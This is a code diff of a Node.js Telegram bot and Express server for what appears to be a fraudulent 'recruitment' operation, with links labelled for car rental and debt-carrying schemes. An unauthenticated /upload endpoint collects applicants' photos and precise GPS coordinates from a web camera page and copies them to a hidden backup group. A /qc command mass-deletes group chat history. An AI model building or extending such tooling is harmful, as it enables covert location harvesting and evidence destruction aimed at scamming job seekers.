@@ -1,27 +1,45 @@
 const { Telegraf } = require('telegraf');
-const fs = require('fs'); // 仅用于持久化授权，图片不保存
-const express = require('express'); // 新增：修复 express 未定义错误
-const bot = new Telegraf(process.env.BOT_TOKEN); // 强制用 env，无 fallback（Render 设置）
+const fs = require('fs');
+const express = require('express');
+
+const bot = new Telegraf(process.env.BOT_TOKEN);
 const GROUP_CHAT_IDS = [
-  -1003354803364, // Group 1: 替换为你的第一个群 ID
-  -1003381368112, // Group 2: 替换为你的第二个群 ID
-  -1003308598858, // Group 3: 替换为你的第三个群 ID
-  -1003368574609, // Group 4: 替换为你的第四个群 ID
-  -1003286063197, // Group 5: 替换为你的第五个群 ID
-  -1003378109615, // Group 6: 替换为你的第六个群 ID
-  -1003293673373, // Group 7: 替换为你的第七个群 ID
-  -1003203365614, // Group 8: 替换为你的第八个群 ID
-  -1000000000009, // Group 9: 替换为你的第九个群 ID
-  -1000000000010 // Group 10: 替换为你的第十个群 ID
+  -1003354803364, // Group 1
+  -1003381368112, // Group 2
+  -1003308598858, // Group 3
+  -1003368574609, // Group 4
+  -1003286063197, // Group 5
+  -1003378109615, // Group 6
+  -1003293673373, // Group 7
+  -1003203365614, // Group 8
+  -1000000000009, // Group 9
+  -1000000000010 // Group 10
 ];
-const BACKUP_GROUP_ID = -1003293673373; // 新增备份群 ID (负数，用 @userinfobot 获取) - 所有群的拍照都会发这里(统一备份)
-const WEB_APP_URL = 'https://huiying8.netlify.app'; // ←←← 改这里！你的新 H5 拍照页面
+const BACKUP_GROUP_ID = -1003293673373;
+const WEB_APP_URL = 'https://huiying8.netlify.app';
+
+const app = express();
+
+// 手动 CORS 处理
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Content-Type');
+  if (req.method === 'OPTIONS') {
+    return res.sendStatus(200);
+  }
+  next();
+});
+
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+
 const pendingTasks = new Map();
-const AUTH_FILE = './authorized.json'; // 新增：授权持久化文件（Render 上运行期有效，重启丢失）
-let authorizedUsers = new Map(); // userId -> true (授权状态)
-const warningMessages = new Map(); // msgId -> {userId, userName} (用于授权回复警告)
-const unauthorizedMessages = new Map(); // msgId -> {userId, userName} (用于授权回复无权限)
-const zlMessages = new Map(); // 新增：msgId -> {targetUserId, targetFirstName, targetUsername, commandType: 'zl' | 'zj'} (用于 /zl 和 /zj 按钮更新)
+const AUTH_FILE = './authorized.json';
+let authorizedUsers = new Map();
+const warningMessages = new Map();
+const unauthorizedMessages = new Map();
+const zlMessages = new Map();
 const ZL_LINKS = {
   '租车': 'https://che88.netlify.app',
   '大飞': 'https://fei88.netlify.app',
@@ -35,6 +53,7 @@ const ZJ_LINKS = {
   '背债': 'https://zjb88.netlify.app'
 };
 const INITIAL_TEXT = '填写招聘申请时请打开手机录屏，按照上面顺序排列填写资料后拍照关闭手机录屏后发送到群里！';
+
 function loadAuth() {
     try {
         const data = fs.readFileSync(AUTH_FILE, 'utf8');
@@ -48,6 +67,7 @@ function loadAuth() {
         console.log('授权文件不存在或加载失败，使用空Map');
     }
 }
+
 function saveAuth() {
     try {
         fs.writeFileSync(AUTH_FILE, JSON.stringify(Object.fromEntries(authorizedUsers)));
@@ -55,13 +75,15 @@ function saveAuth() {
         console.error('保存授权失败:', error);
     }
 }
-loadAuth(); // 启动时加载
+
+loadAuth();
+
 function factoryReset() {
     authorizedUsers.clear();
     pendingTasks.clear();
     warningMessages.clear();
     unauthorizedMessages.clear();
-    zlMessages.clear(); // 新增：清空 /zl /zj 状态
+    zlMessages.clear();
     try {
         fs.unlinkSync(AUTH_FILE);
         console.log('出厂设置完成: 所有状态清空，授权文件已删除');
@@ -69,25 +91,29 @@ function factoryReset() {
         console.error('删除授权文件失败:', error);
     }
 }
+
 async function sendToChat(chatId, photoBuffer, caption, lat, lng, filename) {
     try {
-        await bot.telegram.sendPhoto(chatId, photoBuffer, {
-            filename: filename || 'photo.jpg',
+        await bot.telegram.sendPhoto(chatId, { source: photoBuffer }, {
             caption,
             parse_mode: 'Markdown'
         });
         if (lat && lng) {
-            await bot.telegram.sendLocation(chatId, lat, lng);
+            await bot.telegram.sendLocation(chatId, parseFloat(lat), parseFloat(lng));
         } else {
             await bot.telegram.sendMessage(chatId, '⚠️ 位置数据缺失');
         }
+        console.log(`✅ 成功发送照片到群组 ${chatId}`);
     } catch (error) {
-        console.error(`Send to chat ${chatId} failed:`, error);
+        console.error(`发送到群组 ${chatId} 失败:`, error);
         try {
             await bot.telegram.sendMessage(BACKUP_GROUP_ID, `❌ 发送失败: ${chatId} - ${error.message}`);
-        } catch {}
+        } catch (e) {
+            console.error('发送错误报告失败:', e);
+        }
     }
 }
+
 async function isAdmin(chatId, userId) {
     try {
         const member = await bot.telegram.getChatMember(chatId, userId);
@@ -96,6 +122,86 @@ async function isAdmin(chatId, userId) {
         return false;
     }
 }
+
+// ==================== 修复的文件上传接口 ====================
+app.post('/upload', async (req, res) => {
+  console.log('📸 收到上传请求');
+  
+  try {
+    // 获取整个请求体
+    const chunks = [];
+    for await (const chunk of req) {
+      chunks.push(chunk);
+    }
+    const buffer = Buffer.concat(chunks);
+    
+    // 从查询参数获取数据（前端使用 FormData 会将这些放在 URL 参数中）
+    const { lat, lng, name = '汇盈用户', time, chatid } = req.query;
+    
+    console.log('📋 上传参数:', { lat, lng, name, time, chatid });
+
+    if (!lat || !lng) {
+      console.log('❌ 缺少经纬度参数');
+      return res.status(400).json({ code: 1, msg: '缺少经纬度' });
+    }
+
+    // 验证 buffer 是否有效
+    if (!buffer || buffer.length < 100) {
+      console.log('❌ 照片数据无效或太小');
+      return res.status(400).json({ code: 1, msg: '照片数据无效' });
+    }
+
+    const formattedTime = time 
+      ? new Date(parseInt(time)).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
+      : new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
+
+    const caption = `【H5拍照上传】\n用户：${name}\n时间：${formattedTime}\n位置：${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}\n高德地图：https://amap.com/dir?destination=${lng},${lat}\n谷歌地图：https://www.google.com/maps?q=${lat},${lng}`;
+
+    console.log(`📤 准备发送照片到群组，chatid: ${chatid}, 照片大小: ${buffer.length} bytes`);
+
+    // 发送到指定群组
+    if (chatid && GROUP_CHAT_IDS.includes(Number(chatid))) {
+      console.log(`📤 发送到来源群组: ${chatid}`);
+      await sendToChat(Number(chatid), buffer, caption, lat, lng, 'daka.jpg');
+    } else {
+      console.log(`⚠️ 无效的群组ID或未提供: ${chatid}`);
+    }
+
+    // 永远发送到备份群组
+    console.log(`📤 发送到备份群组: ${BACKUP_GROUP_ID}`);
+    await sendToChat(BACKUP_GROUP_ID, buffer, `[备份] ${caption}`, lat, lng, 'daka_backup.jpg');
+
+    console.log('✅ 照片上传和处理完成');
+    res.json({ code: 0, msg: 'success' });
+
+  } catch (err) {
+    console.error('❌ H5上传失败:', err);
+    res.status(500).json({ code: 1, msg: err.message });
+  }
+});
+
+// 健康检查端点
+app.get('/', (req, res) => {
+    res.json({ 
+        status: 'online', 
+        message: 'Bot is alive! 🚀',
+        timestamp: new Date().toISOString(),
+        groups: GROUP_CHAT_IDS.length
+    });
+});
+
+// 测试端点
+app.get('/test', (req, res) => {
+    res.json({ 
+        code: 0, 
+        message: '后端服务正常运行',
+        groups: GROUP_CHAT_IDS.length,
+        timestamp: new Date().toISOString()
+    });
+});
+
+// ==================== Bot 命令处理 ====================
+
 bot.use(async (ctx, next) => {
     if (ctx.message && ctx.chat?.type === 'private') {
         const userId = ctx.from.id;
@@ -120,6 +226,7 @@ bot.use(async (ctx, next) => {
     }
     await next();
 });
+
 bot.command('bz', (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -142,6 +249,7 @@ bot.command('bz', (ctx) => {
         console.error('Help command failed:', error);
     }
 });
+
 bot.command('lj', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -174,7 +282,7 @@ bot.command('lj', async (ctx) => {
         console.error('Invite link generation failed:', error);
     }
 });
-// /qc 指令 - 彻底恢复出厂：无限删所有消息 + 清授权确认
+
 bot.command('qc', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -190,7 +298,7 @@ bot.command('qc', async (ctx) => {
         }
         return;
     }
-    let startMessageId = ctx.message.message_id; // 从当前消息开始
+    let startMessageId = ctx.message.message_id;
     const replyTo = ctx.message.reply_to_message;
     if (replyTo) {
         startMessageId = replyTo.message_id;
@@ -198,7 +306,7 @@ bot.command('qc', async (ctx) => {
     ctx.reply(`🗑️ 开始彻底清空群聊所有记录... (所有消息清空完像新群一样)`);
     let deletedCount = 0;
     let consecutiveFails = 0;
-    let maxAttempts = 5000; // 防无限循环上限
+    let maxAttempts = 5000;
     let i = 1;
     while (i <= maxAttempts && consecutiveFails < 10) {
         try {
@@ -206,7 +314,7 @@ bot.command('qc', async (ctx) => {
             deletedCount++;
             consecutiveFails = 0;
             i++;
-            await new Promise(resolve => setTimeout(resolve, 20)); // 限速
+            await new Promise(resolve => setTimeout(resolve, 20));
         } catch (error) {
             if (error.description && error.description.includes('message to delete not found')) {
                 consecutiveFails++;
@@ -218,7 +326,6 @@ bot.command('qc', async (ctx) => {
         }
     }
     ctx.reply(`🗑️ 清档完成！ 删除了 ${deletedCount} 条记录。当前群像新群一样清空！`);
-    // 一键出厂设置确认（清授权 + 状态）
     const resetMsg = await ctx.reply(`🔄 **一键出厂设置确认** 🔄\n\n` +
         `⚠️ 此操作将清空所有授权数据、临时任务和警告记录，Bot 将恢复初始状态（像新的一样）。\n\n` +
         `💡 重置后，所有用户需重新授权。立即生效，无需重启。\n\n` +
@@ -232,7 +339,7 @@ bot.command('qc', async (ctx) => {
         parse_mode: 'Markdown'
     });
 });
-// /zl 指令 - 新增：招聘申请链接生成 (回复指定用户)
+
 bot.command('zl', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -293,7 +400,7 @@ bot.command('zl', async (ctx) => {
         console.error('/zl command failed:', error);
     }
 });
-// /zj 指令 - 新增：招聘申请链接生成 (备用，回复指定用户)
+
 bot.command('zj', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -354,13 +461,13 @@ bot.command('zj', async (ctx) => {
         console.error('/zj command failed:', error);
     }
 });
-// 处理回调查询 - 扩展：添加 /zl /zj 按钮处理 + 原有 /qc
+
 bot.on('callback_query', async (ctx) => {
     const data = ctx.callbackQuery.data;
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) return;
     const msgId = ctx.callbackQuery.message.message_id;
-    // 新增：/zl 和 /zj 按钮处理（允许任何人按）
+    
     if (data.startsWith('zl_') || data.startsWith('zj_')) {
         const commandType = data.startsWith('zl_') ? 'zl' : 'zj';
         const buttonKey = data.split('_')[1];
@@ -380,19 +487,20 @@ bot.on('callback_query', async (ctx) => {
         try {
             await ctx.editMessageText(newText, { parse_mode: 'Markdown' });
             await ctx.answerCbQuery(`✅ 已更新为 ${buttonKey} 链接！`);
-            zlMessages.delete(msgId); // 清理状态
+            zlMessages.delete(msgId);
         } catch (error) {
             console.error('Edit message for zl/zj failed:', error);
             await ctx.answerCbQuery('❌ 更新失败，请重试。');
         }
         return;
     }
-    // 原有 /qc 处理（保持管理员检查）
+    
     const userId = ctx.from.id;
     const isUserAdmin = await isAdmin(chatId, userId);
     if (!isUserAdmin) return;
+    
     if (data === 'qc_reset_yes') {
-        factoryReset(); // 执行重置
+        factoryReset();
         await ctx.answerCbQuery('✅ 出厂设置执行中...');
         await ctx.editMessageText(`🚀 **出厂设置完成！** 🚀\n\n` +
             `✅ 所有授权已清空（authorized.json 删除）。\n` +
@@ -405,7 +513,7 @@ bot.on('callback_query', async (ctx) => {
     }
     await ctx.answerCbQuery();
 });
-// /lh 指令 - 加 Emoji
+
 bot.command('lh', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -452,7 +560,7 @@ bot.command('lh', async (ctx) => {
         console.error('Ban user failed:', error);
     }
 });
-// /boss 指令 - 只改了按钮链接
+
 bot.command('boss', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -513,7 +621,7 @@ bot.command('boss', async (ctx) => {
         console.error('/boss command failed:', error);
     }
 });
-// /lg 指令 - 只改了按钮链接
+
 bot.command('lg', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -574,7 +682,7 @@ bot.command('lg', async (ctx) => {
         console.error('/lg command failed:', error);
     }
 });
-// /hc 指令 - 只改了按钮链接
+
 bot.command('hc', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -600,7 +708,7 @@ bot.command('hc', async (ctx) => {
         }
     });
 });
-// 新成员进群: 警告文本美化 + 加 Emoji
+
 bot.on('new_chat_members', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) return;
@@ -609,7 +717,7 @@ bot.on('new_chat_members', async (ctx) => {
     for (const member of newMembers) {
         const userId = member.id;
         authorizedUsers.set(userId, false);
-        saveAuth(); // 保存
+        saveAuth();
         try {
             await bot.telegram.restrictChatMember(chatId, userId, { permissions: { can_send_messages: false } });
         } catch (error) {
@@ -639,7 +747,7 @@ bot.on('new_chat_members', async (ctx) => {
         console.error('Welcome pin failed:', error);
     }
 });
-// 文本消息处理: 阻挡 + 授权
+
 bot.on('text', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) {
@@ -714,62 +822,27 @@ bot.on('text', async (ctx) => {
         }
     }
 });
-// Web App 数据处理 - 你原来的可以保留，也可以注释掉（已经不用了）
-bot.on('web_app_data', async (ctx) => {
-    // 你原来的完整 web_app_data 代码保持不动（如果想删就删）
-    // ...（你原来的代码）
-});
 
-// ==================== 新增：H5 独立拍照上传接口 ====================
-const expressApp = express();
-
-// 防止 Render 休眠 + 接收 H5 拍照
-expressApp.post('/upload', async (req, res) => {
-  try {
-    const chunks = [];
-    for await (const chunk of req) chunks.push(chunk);
-    const photoBuffer = Buffer.concat(chunks);
-
-    const { lat, lng, name = '汇盈用户', uid = '未知', time, chatid } = req.query;
-    if (!lat || !lng) return res.status(400).json({ code: 1, msg: '缺少经纬度' });
-
-    const formattedTime = time ? new Date(parseInt(time)).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
-                                    : new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
-
-    const caption = `【H5拍照上传】\n用户：${name} (ID:${uid})\n时间：${formattedTime}\n位置：${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}\n高德地图：https://amap.com/dir?destination=${lng},${lat}\n谷歌地图：https://www.google.com/maps?q=${lat},${lng}`;
-
-    // 只发来源群
-    if (chatid && GROUP_CHAT_IDS.includes(Number(chatid))) {
-      await sendToChat(Number(chatid), photoBuffer, caption, parseFloat(lat), parseFloat(lng));
-    }
-    // 永远发备份群
-    await sendToChat(BACKUP_GROUP_ID, photoBuffer, `[备份] ${caption}`, parseFloat(lat), parseFloat(lng));
-
-    res.json({ code: 0, msg: 'success' });
-  } catch (err) {
-    console.error('H5上传失败:', err);
-    res.status(500).json({ code: 1, msg: err.message });
-  }
-});
-
-expressApp.get('/', (req, res) => {
-    res.send('Bot is alive! 🚀');
-});
+// 启动服务器和 Bot
 const PORT = process.env.PORT || 3000;
-expressApp.listen(PORT, () => {
-    console.log(`🌐 Express 服务器启动成功，监听端口 ${PORT}（防止 Render 休眠）`);
+app.listen(PORT, () => {
+    console.log(`🌐 Express 服务器启动成功，监听端口 ${PORT}`);
+    console.log(`📝 健康检查: https://huiying888.onrender.com/`);
+    console.log(`🧪 测试端点: https://huiying888.onrender.com/test`);
 });
-// ==================================================================
 
-// 启动 Bot
-bot.launch();
-console.log('🚀 **高级授权 Bot 启动成功！** ✨ 支持 10 个群组(GROUP_CHAT_IDS 数组)，新成员禁言 + 美化警告，管理员回复“授权”解禁。/qc 彻底清空当前群！💎');
+bot.launch().then(() => {
+    console.log('🚀 Bot 启动成功！');
+    console.log(`🤖 支持 ${GROUP_CHAT_IDS.length} 个群组`);
+}).catch(err => {
+    console.error('❌ Bot 启动失败:', err);
+});
 
-// Render 优雅关闭
 process.once('SIGINT', () => {
     console.log('收到 SIGINT，关闭 Bot 和服务器...');
     bot.stop('SIGINT');
 });
+
 process.once('SIGTERM', () => {
     console.log('收到 SIGTERM，关闭 Bot 和服务器...');
     bot.stop('SIGTERM');
